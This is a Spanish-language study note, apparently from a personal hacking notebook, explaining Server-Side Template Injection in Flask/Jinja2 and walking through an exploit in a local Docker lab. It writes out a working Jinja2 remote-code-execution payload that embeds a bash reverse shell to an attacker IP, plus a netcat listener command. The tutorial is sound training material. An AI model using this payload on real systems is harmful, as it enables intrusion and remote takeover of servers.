----
- Tags: #vulnerabilidades #web #logpoisoning #RCE #lfi 
----
# Definición

> El **Server-Side Template Injection** (**SSTI**) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor.

Las plantillas de servidor son archivos que contienen código que se utiliza para generar **contenido dinámico** en una aplicación web. Los atacantes pueden aprovechar una vulnerabilidad de SSTI para inyectar código malicioso en una plantilla de servidor, lo que les permite ejecutar comandos en el servidor y obtener acceso no autorizado tanto a la aplicación web como a posibles datos sensibles.

La inyección de plantillas permite a un atacante incluir código de plantilla en una plantilla **existente (o no)**. Un motor de plantillas **facilita el diseño de páginas HTML** mediante el uso de archivos de plantillas estáticas que, en tiempo de ejecución, **sustituyen las variables/marcadores de posición por valores reales en las páginas HTML**.

Por ejemplo, imagina que una aplicación web utiliza plantillas de servidor para generar correos electrónicos personalizados. Un atacante podría aprovechar una vulnerabilidad de **SSTI** para inyectar código malicioso en la plantilla de correo electrónico, lo que permitiría al atacante ejecutar comandos en el servidor y obtener acceso no autorizado a los datos sensibles de la aplicación web.

En un caso práctico, los atacantes pueden detectar si una aplicación Flask está en uso, por ejemplo, utilizando herramientas como **Whatweb**. Si un atacante detecta que una aplicación **Flask** está en uso, puede intentar explotar una vulnerabilidad de **SSTI**, ya que Flask utiliza el motor de plantillas **Jinja2**, que es vulnerable a este tipo de ataque.

Para los atacantes, detectar una aplicación Flask o Python puede ser un primer paso en el proceso de intentar explotar una vulnerabilidad de SSTI. Sin embargo, los atacantes también pueden intentar identificar vulnerabilidades de SSTI en otras aplicaciones web que utilicen diferentes frameworks de plantillas, como Django, Ruby on Rails, entre otros.

Para prevenir los ataques de SSTI, los desarrolladores de aplicaciones web deben validar y filtrar adecuadamente la entrada del usuario y utilizar herramientas y frameworks de plantillas seguros que implementen medidas de seguridad para prevenir la inyección de código malicioso.

Acá les dejo un Link con una **explicación detallada de diferentes casos** de **SSTI** https://infayer.com/archivos/803

# Explotación de SSTI en Laboratorio

Utilizaremos **Docker** para la creación de un entorno vulnerable a SSTTI de la siguiente manera.

- ``docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground``

Lo que haremos ahora será ingresar a la web http://localhost:8089 ya que con el comando anterior hemos hecho Port Forwarding de nuestro puerto 8089 para que sea el mismo que el del contenedor.

-----

En la web por lo que se puede observar tendremos un panel en el que **podremos colocar nuestro nombre de usuario**, en nuestro caso proporcionaremos nuestro nombre '*C4sp*'

![[SSTI 1.png]]

Como podremos observar, en la web se muestra el **output** del **input** que colocamos nosotros como nombre '*C4sp*', por lo tanto testearemos en vez de colocar ese nombre, poner otra cosa, por ejemplo un numero.

![[SSTI 2.png]]

Como podemos observar en la imagen anterior, la web **nos sigue mostrando el valor que coloquemos** como input, y no solo eso, descubrimos que en la **URL** hay un campo ``?user=`` el cual indica el valor del input que colocamos.

-------

Cuando nosotros encontramos un caso como este, en el que una web de un input que coloquemos se muestra en la web como output, **se está tratando de una plantilla dinámica**, que se **modifica dependiendo de lo que nosotros le coloquemos**.

Lo que podemos hacer en estos casos para verificar si la web es vulnerable a **SSTI** (*Server Side Template Injection*) es proporcionar **una operatoria numérica para ver si es interpretada** o solo nos muestra el mismo valor que colocamos, para esto podemos apoyarnos del repositorio de Github llamado [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) en la sección '*Server Side Template Injection*' para probar los diferentes tipos de *Payloads* para cada caso dependiendo del tipo de plantilla utilizada.

Si nosotros hacemos un ``whatweb http://localhost:80809`` podremos observar que en la web se está utilizando *Python[3.9.13]*, por lo tanto podremos buscar en el repositorio los diferentes tipos de Payloads a utilizar cuando Python está activo. Algo a tener en cuenta es que siempre que hagamos un ``whatweb`` y nos muestre '*Flask*' o '*Python*' es conveniente verificar posible **SSTI**.

![[SSTI 3.png]]

Si colocamos la primer operatoria en la web, comprobaremos si nos interpreta la operatoria ``4*4``

![[SSTI 4.png]]

En este caso lo **verificamos satisfactoriamente**, por lo tanto apoyándonos del mismo repositorio, podremos ver los diferentes tipos de Payloads para **abusar de esta vulnerabilidad SSTI**. 
En nuestro caso comprobaremos si alguno de todos los Payloads de la sección *Jinja2 - Read remote file* funciona, para intentar leer datos del servidor web.

El que nos funcionó a nosotros de todos los brindados fue el siguiente:

![[SSTI 5.png]]

![[SSTI 6.png]]

----

Ahora para hacer todo más crítico **buscaremos** algún *Payload* dentro del repositorio que se **derive este SSTI a un RCE**.

Hay una sección más abajo de la anterior vista llamada *Exploit the SSTI by calling os.popen().read()*, la función `os.popen().read()` en Python **ejecuta un comando en el sistema operativo y devuelve la salida de ese comando** como una cadena de texto.

Por lo tanto la cadena otorgada la cual es ``{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`` la colocaremos en la web, y reemplazaremos el campo "*id*" por el comando que quisiéramos ejecutar.

En nuestro caso queremos enviarnos una consola a nuestra máquina de atacante por lo tanto colocamos el típico oneliner para enviarnos una bash, quedando todo tal que así

- ``{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.0.193/443 0>&1"').read() }}``

Recordemos que en la URL siempre se deben colocar los ``&`` URLENCODED lo cual valdría '*%26*'.

Ahora solo basta con ponernos en escucha con ``nc -nlvp 443`` y ya tendríamos acceso a la máquina.
